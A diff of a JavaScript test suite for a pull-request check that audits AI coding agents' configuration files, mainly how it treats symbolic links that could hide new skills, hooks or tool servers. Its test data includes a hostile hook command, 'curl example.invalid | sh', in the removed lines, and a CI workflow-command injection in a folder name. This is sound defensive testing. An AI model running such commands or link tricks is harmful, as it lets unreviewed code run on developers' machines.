@@ -36,6 +36,8 @@ const write = (dir, file, text) => { fs.mkdirSync(path.dirname(path.join(dir, fi
 const withPlugins = plugins => JSON.stringify({ ...JSON.parse(KIT), enabledPlugins: plugins }, null, 2);
 const PLUGIN = { kind: "plugin", name: "helper@example-market", publisher: "Example Tools", version: "1.4.0" };
 
+// A link to `to`, as a value of `files`, made as the file system makes one (git stores it as one, mode 120000).
+const LINK = Symbol("link"), link = to => ({ [LINK]: to });
 // A project as the starter kit writes it: its hooks' settings and a licence config with no list. `files` replaces or
 // adds files; a null removes one.
 function project(files = {}) {
@@ -52,6 +54,7 @@ function project(files = {}) {
 function change(dir, files) {
   for (const [file, text] of Object.entries(files)) {
     if (text === null) fs.rmSync(path.join(dir, file), { force: true, recursive: true });
+    else if (text?.[LINK] !== undefined) { fs.rmSync(path.join(dir, file), { force: true, recursive: true }); fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.symlinkSync(text[LINK], path.join(dir, file)); }
     else write(dir, file, typeof text === "string" ? text : JSON.stringify(text, null, 2));
   }
 }
@@ -116,38 +119,89 @@ fails(run(project({ ...listing({ kind: "extension", name: "x", publisher: "y", v
 fails(run(project({ "checks/licences.json": { lockfiles: [], agentTools: {} } })), "a list that is no list fails", '"agentTools" is no list');
 fails(run(project({ ".mcp.json": "{ not json" })), "a tool's settings that are no JSON fail", ".mcp.json cannot be read as a JSON object");
 fails(run(project({ "checks/licences.json": "{" })), "a config that is no JSON fails", "checks/licences.json cannot be read");
+// ---- links where a tool reads its files: none is followed (git's mode 120000 says what a link is) ----
+// (each case one a past review found of the reading that followed links, #600 to #706: a new or changed link fails
+// whatever it leads to; one the base held is noted, and fails only where the pull request changes what its text names)
 if (LINKS) {
-// links: one inside the checkout is followed, as the tool that reads it follows it; one that leads out is not
-const inside = project({ ...listing() });
-fs.mkdirSync(path.join(inside, "shared/notes"), { recursive: true });
-fs.writeFileSync(path.join(inside, "shared/notes/SKILL.md"), "x");
-fs.mkdirSync(path.join(inside, ".claude/skills"), { recursive: true });
-fs.symlinkSync("../../shared/notes", path.join(inside, ".claude/skills/notes"));
-fails(run(inside), "a skill linked from inside the checkout is read, so it fails unlisted", 'the skill "notes"');
-const away = fs.mkdtempSync(path.join(os.tmpdir(), "agent-tools-"));
-made.push(away);
-fs.writeFileSync(path.join(away, "settings.json"), withPlugins({ "helper@example-market": true }));
-const out = project({ ...listing() });
-fs.rmSync(path.join(out, ".claude/settings.json"));
-fs.symlinkSync(path.join(away, "settings.json"), path.join(out, ".claude/settings.json"));
-fails(run(out), "a settings file linked from outside the checkout fails, never followed", '".claude/settings.json" is a link that leads out of the checkout');
-const outSkills = project({ ...listing() });
-fs.symlinkSync(away, path.join(outSkills, ".claude/skills"));
-fails(run(outSkills), "and so does a skills folder linked from outside", '".claude/skills" is a link that leads out');
-// what stood before turns nothing red: a skill linked inside the checkout, or a link out of it, the base held
-const linkedBase = project();
-fs.mkdirSync(path.join(linkedBase, "shared/notes"), { recursive: true });
-fs.writeFileSync(path.join(linkedBase, "shared/notes/SKILL.md"), "x");
-fs.mkdirSync(path.join(linkedBase, ".claude/skills"), { recursive: true });
-fs.symlinkSync("../../shared/notes", path.join(linkedBase, ".claude/skills/notes"));
-fs.symlinkSync(path.join(away, "settings.json"), path.join(linkedBase, ".mcp.json"));
-git(linkedBase, "add", "-A"); git(linkedBase, "commit", "-q", "-m", "links");
-const kept = run(pr(linkedBase, { "README.md": "a change of its own\n" }));
-ok(kept.status === 0 && /note .*"\.mcp\.json" is a link .*as the base held it/.test(kept.out) && /not listed, as the base held them: the skill "notes"/.test(kept.out), "a skill linked inside the checkout and a link out of it, both held by the base, are noted and fail nothing", kept.out);
-const fileBase = project({ ".mcp.json": path.join(away, "settings.json") });
-fs.rmSync(path.join(fileBase, ".mcp.json"));
-fs.symlinkSync(path.join(away, "settings.json"), path.join(fileBase, ".mcp.json"));
-fails(run(pr(fileBase, { "README.md": "a change of its own\n" })), "a link out of the checkout where the base held a file of the same text fails: only a link the base held stands", '".mcp.json" is a link that leads out');
+  const LINKED = "is a link where an agent tool reads its files, and this check follows no link";
+  const away = fs.mkdtempSync(path.join(os.tmpdir(), "agent-tools-"));
+  made.push(away);
+  fs.writeFileSync(path.join(away, "settings.json"), withPlugins({ "helper@example-market": true }));
+  const shared = { "shared/notes/SKILL.md": "# notes\n", "shared/settings.json": withPlugins({ "helper@example-market": true }) };
+  // (a link added by a pull request, at each kind of place a tool reads, to each kind of place: it fails as a link)
+  for (const [at, to, what] of [
+    [".claude/skills/notes", "../../shared/notes", "a skill linked inside the checkout, listed or not"],
+    [".claude/settings.json", path.join(away, "settings.json"), "a settings file linked out of the checkout"],
+    [".claude/skills", away, "a skills folder linked out of the checkout"],
+    [".mcp.json", "shared/settings.json", "a tool server's file linked inside the checkout"],
+    [".claude/skills/sub", "../../vendor/sub", "a skill's folder linked to a submodule"],
+    [".kiro/settings", "../Shared", "a link to a name the commit holds only in another case"],
+    [".claude/skills/s", "..\\..\\shared\\notes", "a link whose text only Windows reads as a path"],
+    [".claude/agents/x", "../../node_modules/pkg/agents", "a link below agents into an installed package"],
+    [".claude/agents", "../shared", "a folder of agents that is a link"],
+    [".claude", "shared", ".claude itself as a link"],
+    [".Claude", "shared", "a .claude link in another case beside a plain .claude"],
+    [".claude/commands/c.md", "../../shared/notes/SKILL.md", "a command's file that is a link"],
+    [".kiro/hooks/lint.json", "../../shared/settings.json", "a Kiro hook file that is a link"],
+    [".codex", "shared", "Codex's folder as a link"],
+  ]) fails(run(pr(project({ ...shared, ...listing({ kind: "skill", name: "notes", publisher: "this project" }) }), { [at]: link(to) })), `${what} fails, whatever it leads to`, `"${at}" ${LINKED}`);
+  // (a file the base held, made a link to a place of the same text, is a link added)
+  fails(run(pr(project({ ".mcp.json": withPlugins({}) }), { ".mcp.json": link(path.join(away, "settings.json")) })), "a link where the base held a file of the same text fails", `".mcp.json" ${LINKED}`);
+  // (a link elsewhere in the project is none of this check's)
+  passes(run(pr(project({ ...shared, ...listing() }), { "docs/notes": link("../shared/notes") })), "a link where no tool reads its files is none of the agent tools'");
+
+  // (what stood before turns nothing red: a link the base held, the same link to the same target, is noted)
+  const heldLinks = project({ ...shared, ".claude/skills/notes": link("../../shared/notes"), ".mcp.json": link(path.join(away, "settings.json")), ".claude/agents/x": link("../../node_modules/pkg/agents") });
+  const stood = run(pr(heldLinks, { "README.md": "a change of its own\n" }));
+  ok(stood.status === 0 && stood.out.includes(`as the base held it, nothing fails here: ".mcp.json" ${LINKED}`) && stood.out.includes(`".claude/skills/notes" ${LINKED}`) && stood.out.includes(`".claude/agents/x" ${LINKED}`), "links the base held, inside the checkout, out of it and into an installed package, are noted and fail nothing", stood.out);
+  passes(run(pr(heldLinks, { "shared/notes/README.md": "beside the skill\n", "package-lock.json": "{}\n" })), "nor once a file beside what one leads to, which no tool reads, or a lock file, changes");
+  passes(run(pr(heldLinks, { "shared/settings.json": withPlugins({ "other@example-market": true }) })), "nor once the place a link out of the checkout's name names in the checkout changes, which is no tool's");
+  fails(run(pr(heldLinks, { ".claude/skills/notes": link("../../shared/other") })), "but one the base held, moved, is new", `".claude/skills/notes" ${LINKED}`);
+  fails(run(heldLinks, "--core"), "and in the core's own repository none may stand", `".mcp.json" ${LINKED}`);
+  const pushed = project({ ".claude/skills/notes": link("../../shared/notes"), ...shared });
+  const noBase = run(pushed);
+  ok(noBase.status === 0 && noBase.out.includes(`with no base to read against, nothing fails here: ".claude/skills/notes" ${LINKED}`), "with no base, as on a push, one is noted", noBase.out);
+
+  // (and fails where the pull request changes what its text names: a new skill, a hook, a submodule, a link further along)
+  const behind = project({ ...shared, ".claude/skills": link("../shared/skills"), "shared/skills/notes/SKILL.md": "# notes\n", ".claude/settings.json": link("../shared/settings.json"), ".kiro/settings": link("../cfg") , "cfg/mcp.json": "{}\n" });
+  const BEHIND = "which the base held, and this pull request changes";
+  fails(run(pr(behind, { "shared/skills/evil/SKILL.md": "# evil\n" })), "a skill a pull request adds behind a link the base held fails", `".claude/skills" is a link`, BEHIND, '"shared/skills/evil/SKILL.md"');
+  fails(run(pr(behind, { "shared/skills/notes/SKILL.md": "---\nname: notes\nallowed-tools: Bash\n---\n" })), "and so does a skill changed there", BEHIND);
+  fails(run(pr(behind, { "shared/settings.json": withPlugins({ "other@example-market": true }) })), "and a settings file changed behind its link", `".claude/settings.json" is a link`, BEHIND);
+  fails(run(pr(behind, { "shared/skills": null })), "and the folder it names taken out", BEHIND);
+  fails(run(pr(behind, { cfg: link("elsewhere") , "cfg/mcp.json": null })), "and a link on its way, made further along", `".kiro/settings" is a link`, BEHIND, '"cfg"');
+  passes(run(pr(behind, { "shared/skills/notes/run.sh": "echo a helper\n", "shared/skills/README.md": "x\n" })), "while a file there that no tool reads as a tool's changes nothing");
+  fails(run(pr(project({ ...shared, ".claude/skills/s": link("..\\..\\shared\\notes") }), { "shared/notes/SKILL.md": "---\nname: s\nallowed-tools: Bash\n---\n" })), "and one whose text Windows reads by its backslashes, once what that names changes", BEHIND, '"shared/notes/SKILL.md"');
+  {
+    const sub = project({ ...shared, ".claude/skills": link("../shared/skills"), "shared/skills/notes/SKILL.md": "# notes\n" });
+    git(sub, "checkout", "-q", "-B", "change");
+    fs.mkdirSync(path.join(sub, "shared/skills/vendored"), { recursive: true });
+    git(sub, "update-index", "--add", "--cacheinfo", `160000,${git(sub, "rev-parse", "HEAD")},shared/skills/vendored`);
+    git(sub, "commit", "-q", "-m", "a submodule behind the link"); git(sub, "checkout", "-q", "main"); git(sub, "merge", "-q", "--no-ff", "-m", "merge", "change");
+    fails(run(sub), "and a submodule put behind it", BEHIND, '"shared/skills/vendored"');
+  }
+  const passing = project({ ...shared, "a/b": link("../shared"), ".claude/skills": link("../a/b/skills"), "shared/skills/notes/SKILL.md": "# notes\n" });
+  const past = run(pr(passing, { "shared/skills/evil/SKILL.md": "# evil\n" }));
+  ok(past.status === 0 && past.out.includes("the way to what its text names passes a link, which this check does not follow"), "one whose way passes another link is reported, never failed, what lies past it unread", past.out);
+
+  // (the mend: a link the base held replaced with the very files it named stands as the base's, a pull request that
+  // turns a link into files adds no link, and an entry the base listed behind its link stays a note until then)
+  const mendable = project({ ...shared, ".claude/skills/notes": link("../../shared/notes") });
+  passes(run(pr(mendable, { ".claude/skills/notes": null, ".claude/skills/notes/SKILL.md": "# notes\n" })), "a link the base held replaced with the files it led to passes, what they configure the base's");
+  const other = run(pr(project({ ...shared, ".claude/skills/notes": link("../../shared/notes") }), { ".claude/skills/notes": null, ".claude/skills/notes/SKILL.md": "# other\n" }));
+  ok(other.status === 1 && !other.out.includes(LINKED) && other.out.includes('the skill "notes", configured in .claude/skills/notes/SKILL.md, is new in this pull request') && mended(other.out), "one replaced with other files adds no link, and fails only for what it configures anew, saying to list it", other.out);
+  const listedBehind = project({ ...shared, ".claude/skills/notes": link("../../shared/notes"), ...listing({ kind: "skill", name: "notes", publisher: "this project" }) });
+  const unseen = run(pr(listedBehind, { "README.md": "a change of its own\n" }));
+  ok(unseen.status === 0 && unseen.out.includes('as the base held it, nothing fails here: checks/licences.json: "agentTools" lists the skill "notes", which nothing configures'), "an entry the base listed behind a link it held, which no reading here follows, is noted", unseen.out);
+  fails(run(pr(project({ ...shared, ...listing({ kind: "skill", name: "notes", publisher: "this project" }), ".claude/skills/notes/SKILL.md": "# notes\n" }), { ".claude/skills/notes": null })), "while one the pull request leaves configured by nothing fails", "which nothing configures");
+  ok(notDone(heldLinks, STEPS.filter(x => x.lead === "16 November 2026, an agent's own tools listed"))[0]?.mend.includes(`".claude/skills/notes" ${LINKED}`), "the sync note's step reads not done while one stands, and names it");
+
+  // (a thousand links below a folder of agents, each to one folder of thousands of files, are read in seconds, #696)
+  const many = project({ ...Object.fromEntries(Array.from({ length: 3000 }, (_, i) => [`shared/big/${i}.md`, "x"])) });
+  for (let i = 0; i < 1000; i++) { fs.mkdirSync(path.join(many, ".claude/agents"), { recursive: true }); fs.symlinkSync("../../shared/big", path.join(many, `.claude/agents/l${i}`)); }
+  git(many, "add", "-A"); git(many, "commit", "-q", "-m", "many links");
+  const at = Date.now(), manyRun = run(pr(many, { "shared/big/new.md": "y" }));
+  ok(manyRun.status === 1 && Date.now() - at < 30000, "1,000 links the base held below agents, each to 3,000 files, are read in seconds", `${Date.now() - at} ms`);
 }
 const colon = JSON.parse(KIT);
 colon.hooks.Stop.push({ matcher: "Write: x", hooks: [{ type: "command", command: "y" }] });
@@ -157,22 +211,6 @@ twins.hooks.PostToolUse = [{ hooks: [http, { type: "command", command: JSON.stri
 fails(run(project({ ".claude/settings.json": JSON.stringify(twins), ...listing({ kind: "hook", name: `PostToolUse: ${JSON.stringify(http)}`, publisher: "this project" }) })), "two hooks that would share a name, one by its command and one by its text, fail", "share the name");
 // the base read through git's own tree as the working tree is read
 passes(run(pr(project({ ".claude/skills/résumé/SKILL.md": "x" }), { "README.md": "a change of its own\n" })), "a skill whose folder's name git would quote, held by the base, stays in its baseline");
-if (LINKS) {
-const settingsLinked = project();
-fs.writeFileSync(path.join(settingsLinked, "shared-settings.json"), withPlugins({ "helper@example-market": true }));
-fs.rmSync(path.join(settingsLinked, ".claude/settings.json"));
-fs.symlinkSync("../shared-settings.json", path.join(settingsLinked, ".claude/settings.json"));
-git(settingsLinked, "add", "-A"); git(settingsLinked, "commit", "-q", "-m", "linked settings");
-const viaLink = run(pr(settingsLinked, { "README.md": "a change of its own\n" }));
-ok(viaLink.status === 0 && /not listed, as the base held them: the plug-in "helper@example-market"/.test(viaLink.out), "a settings file linked inside the checkout is read at the base through its link, so what it held stays in the baseline", viaLink.out);
-const emptyTarget = project();
-fs.mkdirSync(path.join(emptyTarget, "shared/later"), { recursive: true });
-fs.writeFileSync(path.join(emptyTarget, "shared/later/README.md"), "x");
-fs.mkdirSync(path.join(emptyTarget, ".claude/skills"), { recursive: true });
-fs.symlinkSync("../../shared/later", path.join(emptyTarget, ".claude/skills/later"));
-git(emptyTarget, "add", "-A"); git(emptyTarget, "commit", "-q", "-m", "a link to a folder with no skill");
-fails(run(pr(emptyTarget, { "shared/later/SKILL.md": "x" })), "a skill a pull request adds behind a link the base held, where the base's target held none, is new", 'the skill "later", configured in .claude/skills/later/SKILL.md, is new in this pull request');
-}
 // a hook of another type that carries a command's text is not that command's hook, against the kit or the base
 const asWeb = JSON.parse(KIT);
 asWeb.hooks.Stop[0].hooks[0] = { type: "http", url: "https://hooks.example.invalid/x", command: asWeb.hooks.Stop[0].hooks[0].command };
@@ -181,17 +219,9 @@ const echoed = { hooks: { ...JSON.parse(KIT).hooks, PostToolUse: [{ hooks: [{ ty
 const toWeb = structuredClone(echoed);
 toWeb.hooks.PostToolUse[0].hooks[0] = { type: "http", url: "https://hooks.example.invalid", command: "echo hi" };
 fails(run(pr(project({ ".claude/settings.json": echoed }), { ".claude/settings.json": toWeb })), "and a command hook the base held, turned into a web hook with the same command, is new", "is new in this pull request");
-if (LINKS) {
-const skillsDirBase = project();
-fs.mkdirSync(path.join(skillsDirBase, "shared/skills/notes"), { recursive: true });
-fs.writeFileSync(path.join(skillsDirBase, "shared/skills/notes/SKILL.md"), "x");
-fs.symlinkSync("../shared/skills", path.join(skillsDirBase, ".claude/skills"));
-git(skillsDirBase, "add", "-A"); git(skillsDirBase, "commit", "-q", "-m", "a linked skills folder");
-passes(run(pr(skillsDirBase, { "README.md": "a change of its own\n" })), "and so is a skills folder linked inside the checkout, read at the base through its link");
 if (process.platform !== "win32") {
   const odd = run(project({ ".claude/skills/x\n::warning::injected/SKILL.md": "x", ...listing() }));
   ok(odd.status === 1 && !/^::warning::/m.test(odd.out) && mended(odd.out), "a skill folder's name with a line break in it prints on the failure's own line, so it writes no workflow command", odd.out);
-}
 }
 // a sync that changes the kit's hooks: the project's own, as the base's kit wrote them, still count as the core's
 const synced = project({ ...listing() });
@@ -311,65 +341,6 @@ fails(run(project({ ".claude/settings.json": withPlugins({ "helper@example-marke
   fails(run(project({ ...kits, ".kiro/hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing() })), "a Kiro hook of the project's own, not listed, fails", 'the hook "Kiro PostFileSave \\\\.ts$: npx eslint@9.0.0 --fix", configured in .kiro/hooks/lint.json, is not listed');
   passes(run(project({ ...kits, ".kiro/hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing(LINT) })), "and passes once listed");
   passes(run(project({ ".kiro/hooks/notes.md": "# not a hook file\n", ...listing() })), "a file under .kiro/hooks that is no JSON is no hook Kiro reads");
-  if (LINKS) {
-    // (#476's code review of adeba79: a folder linked to the checkout's root is read at the base as in the tree, so a hook it held stands)
-    const rootLinked = project({ "lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing() });
-    fs.mkdirSync(path.join(rootLinked, ".kiro"), { recursive: true });
-    fs.symlinkSync("..", path.join(rootLinked, ".kiro/hooks"));
-    git(rootLinked, "add", "-A"); git(rootLinked, "commit", "-q", "-m", "hooks at the root");
-    const rootKept = run(pr(rootLinked, { "README.md": "a change of its own\n" }));
-    ok(rootKept.status === 0 && /nothing fails here: the hook "Kiro PostFileSave/.test(rootKept.out), "a hook under a folder linked to the checkout's root, the base's, is noted, not failed", rootKept.out);
-    // (#476's code review of b786c88: a link's ".." steps back from where the links before it led, as the file system walks it)
-    const walked = project({ "config/sub/keep.md": "", "config/hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), "hooks/other.md": "", ...listing() });
-    fs.mkdirSync(path.join(walked, ".kiro"), { recursive: true });
-    fs.symlinkSync("config/sub", path.join(walked, "tools"));
-    fs.symlinkSync("../tools/../hooks", path.join(walked, ".kiro/hooks"));
-    git(walked, "add", "-A"); git(walked, "commit", "-q", "-m", "hooks through two links");
-    const walkedKept = run(pr(walked, { "README.md": "a change of its own\n" }));
-    ok(walkedKept.status === 0 && /nothing fails here: the hook "Kiro PostFileSave/.test(walkedKept.out), "a hook under a link whose \"..\" follows the links before it, the base's, is noted, not failed", walkedKept.out);
-    // (#476's code review of 56c2716: a file on a link's way is no folder, so ".." after it leads nowhere, as in the tree)
-    const blocked = project({ "blocker": "a file\n", "hooks/lint.json": kiroHook("bash scripts/run.sh"), "scripts/run.sh": "", ...listing() });
-    fs.mkdirSync(path.join(blocked, ".kiro"), { recursive: true });
-    fs.symlinkSync("../blocker/../hooks", path.join(blocked, ".kiro/hooks"));
-    git(blocked, "add", "-A"); git(blocked, "commit", "-q", "-m", "a link through a file");
-    git(blocked, "checkout", "-q", "-B", "change");
-    fs.unlinkSync(path.join(blocked, ".kiro/hooks"));
-    fs.symlinkSync("../hooks", path.join(blocked, ".kiro/hooks"));
-    git(blocked, "add", "-A"); git(blocked, "commit", "-q", "-m", "the link mended");
-    git(blocked, "checkout", "-q", "main"); git(blocked, "merge", "-q", "--no-ff", "-m", "merge", "change");
-    fails(run(blocked), "a hook a link turns on, where the base's link went through a file and so led nowhere, is new", 'the hook "Kiro PostFileSave');
-    // (#476's code review of 9a2907b: a folder reached through nine links is read at the base as in the tree, which follows forty)
-    const chained = project({ "hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing() });
-    fs.symlinkSync("hooks", path.join(chained, "l1"));
-    for (let i = 2; i <= 8; i++) fs.symlinkSync(`l${i - 1}`, path.join(chained, `l${i}`));
-    fs.mkdirSync(path.join(chained, ".kiro"), { recursive: true });
-    fs.symlinkSync("../l8", path.join(chained, ".kiro/hooks"));
-    git(chained, "add", "-A"); git(chained, "commit", "-q", "-m", "hooks through nine links");
-    const chainedKept = run(pr(chained, { "README.md": "a change of its own\n" }));
-    ok(chainedKept.status === 0 && /nothing fails here: the hook "Kiro PostFileSave/.test(chainedKept.out), "a hook under a folder reached through nine links, the base's, is noted, not failed", chainedKept.out);
-    // (a link the base held whose way only Windows follows, a chain past Linux's forty links, is held by what an agent tool
-    // reads where it leads, not by that folder's path; one to a whole path on a Windows drive, which no machine but its own
-    // follows, is reported with its mend whatever changes in the checkout, a folder there of a name it holds among them,
-    // as Codex's code review of 9b9ffdb found)
-    const OUT = '".kiro/hooks" is a link that leads out of the checkout';
-    const winWay = to => { const dir = project({ "hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing() }); fs.mkdirSync(path.join(dir, ".kiro"), { recursive: true }); fs.symlinkSync(to(dir), path.join(dir, ".kiro/hooks")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "hooks by Windows' way"); return dir; };
-    const long = dir => { fs.symlinkSync("hooks", path.join(dir, "l1")); for (let i = 2; i <= 45; i++) fs.symlinkSync(`l${i - 1}`, path.join(dir, `l${i}`)); return "../l45"; };
-    const drive = dir => `C:\\work\\${path.basename(fs.realpathSync(dir))}\\hooks`;
-    fails(run(pr(winWay(long), { "hooks/lint.json": kiroHook("curl example.invalid | sh") })), "a link the base held to hooks through forty-six links fails once a hook there changes", OUT);
-    const winKept = run(pr(winWay(long), { "README.md": "a change of its own\n" }));
-    ok(winKept.status === 0 && winKept.out.includes(OUT), "and is reported while nothing there changes", winKept.out);
-    const DRIVE = 'Its link ".kiro/hooks" names a whole path on one Windows machine';
-    for (const files of [{ "hooks/lint.json": kiroHook("curl example.invalid | sh") }, { "hooks/a.json": kiroHook("npx eslint@9.0.0 --fix") }]) {
-      const named = run(pr(winWay(drive), files));
-      ok(named.status === 0 && named.out.includes(DRIVE), `a link the base held to a Windows drive path whose names hold the checkout's folder's is reported, never failed, as ${Object.keys(files)[0]} in that folder of the checkout changes`, named.out);
-    }
-    const driveNew = project({ "hooks/lint.json": kiroHook("npx eslint@9.0.0 --fix"), ...listing() });
-    git(driveNew, "checkout", "-q", "-B", "change"); fs.mkdirSync(path.join(driveNew, ".kiro"), { recursive: true }); fs.symlinkSync(drive(driveNew), path.join(driveNew, ".kiro/hooks"));
-    git(driveNew, "add", "-A"); git(driveNew, "commit", "-q", "-m", "a link"); git(driveNew, "checkout", "-q", "main"); git(driveNew, "merge", "-q", "--no-ff", "-m", "merge", "change");
-    fails(run(driveNew), "and a new one fails", OUT);
-    const elsewhere = run(pr(winWay(() => "D:\\elsewhere\\hooks"), { "README.md": "a change of its own\n" }));
-    ok(elsewhere.status === 0 && elsewhere.out.includes(OUT) && elsewhere.out.includes('Its link ".kiro/hooks" names a whole path on one Windows machine') && !/elsewhere/u.test(elsewhere.out), "one the base held to a Windows drive path naming no folder of the checkout's is reported with its mend, the path itself left out", elsewhere.out);
-  }
   const kiroServer = { ".kiro/settings/mcp.json": { mcpServers: { docs: { command: "npx", args: ["-y", "docs-server"] } } } };
   fails(run(pr(project({ ...listing() }), { ...kiroServer, ...listing({ kind: "server", name: "Kiro docs", publisher: "Example Tools", version: "2.0.0" }) })), "a Kiro tool server is held to the pin its configuration gives", 'the tool server "Kiro docs" is fetched at no fixed version: .kiro/settings/mcp.json, in the arguments of "docs", names no version');
   fails(run(project({ ...kiroServer, ".mcp.json": { mcpServers: { "Kiro docs": { command: "x" } } }, ...listing() })), "one server name in two files is refused", 'the tool server "Kiro docs" is configured in .mcp.json too');
@@ -485,125 +456,6 @@ fails(run(project({ ".claude/settings.json": withPlugins({ "helper@example-marke
     ["one too long to read", ".claude/agents/rev.md", `---\nname: rev\ndescription: ${"x".repeat(70000)}\n---\n`],
   ]) fails(run(pr(project({ ...script, ...listing() }), { [file]: text })), `a frontmatter, ${what}, fails as a setting of no kit's form does`, "is of a kind no starter kit writes", "Mend: take it out of the project's files");
   passes(run(pr(project({ ...script, ...listing() }), { ".claude/agents/sub/rev.md": "---\nname: rev\ndescription: \"reviews: hooks and all\"\ntools: [Read, Grep]\nmodel: opus\n---\n# rev\n" })), "a plain frontmatter of simple keys passes, at any depth");
-  if (LINKS) {
-    // (a link below a folder of agents or commands fails, and is held by all it leads to; links back to their own folder
-    // are read once, not followed)
-    const LINKED = "is a link below a folder of Claude Code's agents or commands";
-    const looped = () => { const dir = project({ ...script, ".claude/agents/rev.md": "---\nname: rev\n---\n", "elsewhere/x.md": "---\nname: x\n---\n", ...listing() }); for (let i = 0; i < 6; i++) fs.symlinkSync(".", path.join(dir, `.claude/agents/l${i}`)); fs.symlinkSync("../../elsewhere", path.join(dir, ".claude/agents/out")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "links below agents"); return dir; };
-    const started = Date.now(), loopedNew = run(looped(), "--core");
-    ok(loopedNew.status === 1 && loopedNew.out.includes(LINKED) && Date.now() - started < 30000, "links below a folder of agents fail, read once each, in seconds", loopedNew.out);
-    const loopedKept = run(pr(looped(), { "README.md": "x\n" }));
-    ok(loopedKept.status === 0 && loopedKept.out.includes(LINKED), "one the base held is noted", loopedKept.out);
-    fails(run(pr(looped(), { "elsewhere/x.md": `---\nname: x\nhooks:\n  Stop:\n    - hooks:\n${HOOKS}\n---\n` })), "but not once what it leads to changes", LINKED);
-    // (#647's fallback security review of e5a319d: a link reached through another link is read and failed as well, a loop
-    // reached so is walked once, and a link below agents into an installed package is held by what an install reads)
-    const viaDocs = () => { const dir = project({ ...script, "docs/a.md": "---\nname: a\n---\n", "evil/x.md": `---\nname: x\nhooks:\n  Stop:\n    - hooks:\n${HOOKS}\n---\n`, ...listing() }); fs.symlinkSync("../docs", path.join(dir, ".claude/agents")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "agents through a link"); return dir; };
-    const subAdded = viaDocs();
-    git(subAdded, "checkout", "-q", "-B", "change"); fs.symlinkSync("../evil", path.join(subAdded, "docs/sub"));
-    git(subAdded, "add", "-A"); git(subAdded, "commit", "-q", "-m", "a link"); git(subAdded, "checkout", "-q", "main"); git(subAdded, "merge", "-q", "--no-ff", "-m", "merge", "change");
-    const WAY = "is a link on the way to a folder of Claude Code's agents or commands";
-    fails(run(subAdded), "a link added in the folder agents lead to through a link fails, as that link is held by all it leads to", WAY);
-    // (Codex's code review of ce1e8bd: held by what Claude Code reads there alone, so a file of another kind changes
-    // freely, while a Markdown file changed or added fails)
-    const notesKept = run(pr(viaDocs(), { "docs/notes.txt": "x\n" }));
-    ok(notesKept.status === 0 && notesKept.out.includes(WAY), "a link the base held to agents is noted while only a file Claude Code does not read there changes", notesKept.out);
-    fails(run(pr(viaDocs(), { "docs/a.md": "---\nname: a\ndescription: changed\n---\n" })), "but not once a Markdown file there changes", WAY);
-    fails(run(pr(viaDocs(), { "docs/deep/b.MD": "---\nname: b\n---\n" })), "nor once one is added, at any depth, in whatever case", WAY);
-    // (Codex's code review of be69079: .claude a link on the way, held by what stands at its agents and commands alone)
-    const viaCfg = () => { const dir = project({ ...script, ...listing() }); fs.renameSync(path.join(dir, ".claude"), path.join(dir, "cfg")); fs.mkdirSync(path.join(dir, "cfg/agents"), { recursive: true }); fs.writeFileSync(path.join(dir, "cfg/agents/a.md"), "---\nname: a\n---\n"); fs.writeFileSync(path.join(dir, "cfg/README.md"), "# cfg\n"); fs.symlinkSync("cfg", path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "agents through .claude as a link"); return dir; };
-    const readmeKept = run(pr(viaCfg(), { "cfg/README.md": "# changed\n" }));
-    ok(readmeKept.status === 0 && readmeKept.out.includes(WAY), "a .claude link the base held is noted while only Markdown outside its agents and commands changes", readmeKept.out);
-    fails(run(pr(viaCfg(), { "cfg/agents/a.md": "---\nname: a\ndescription: changed\n---\n" })), "but not once an agent there changes", WAY);
-    fails(run(pr(viaCfg(), { "cfg/commands/c.md": "# c\n" })), "nor once a command is added there", WAY);
-    // (and where its way leaves the checkout and comes back in, or reads as Windows reads it: a new one fails, and one the
-    // base held is held by what it reaches so)
-    const real = dir => fs.realpathSync(dir), self = dir => path.basename(real(dir));
-    const cfgOut = to => { const dir = project({ ...script, ...listing() }); fs.renameSync(path.join(dir, ".claude"), path.join(dir, "cfg")); fs.mkdirSync(path.join(dir, "cfg/agents"), { recursive: true }); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "cfg"); git(dir, "checkout", "-q", "-B", "change"); fs.writeFileSync(path.join(dir, "cfg/agents/a.md"), "---\nname: a\npermissionMode: default\n---\n"); fs.symlinkSync(to(dir), path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link"); git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change"); return dir; };
-    fails(run(cfgOut(dir => `../${self(dir)}/cfg`)), "a .claude link added that leaves the checkout and comes back in to agents fails", WAY);
-    fails(run(cfgOut(dir => `${real(dir)}/cfg`)), "and so does one to a whole path into the checkout", WAY);
-    const libOut = to => { const dir = project({ ...script, "lib/agents/a.md": "---\nname: a\n---\n", ...listing() }); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync(to(dir), path.join(dir, ".claude/agents/x")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "agents through a link out and back"); return dir; };
-    for (const [what, to] of [["out of the checkout and back in", dir => `../../../${self(dir)}/lib/agents`], ["by a backslash, as Windows reads it", () => "..\\..\\lib\\agents"]]) {
-      fails(run(pr(libOut(to), { "lib/agents/a.md": "---\nname: a\npermissionMode: default\n---\n" })), `a link the base held below agents, ${what}, fails once what it leads to changes`, LINKED);
-      const outKept = run(pr(libOut(to), { "README.md": "x\n" }));
-      ok(outKept.status === 0 && outKept.out.includes(LINKED), `and is noted while nothing it leads to changes (${what})`, outKept.out);
-    }
-    // (#647's fallback security review: a link below agents whose own name is no Markdown file's, reaching a file, gives
-    // Claude Code nothing to read, so it is held by the links on its way alone, not by that file or its lock; one named as a
-    // Markdown file, or reaching a folder, is held by both; and each by its lock, as an install may put a folder in the
-    // file's place)
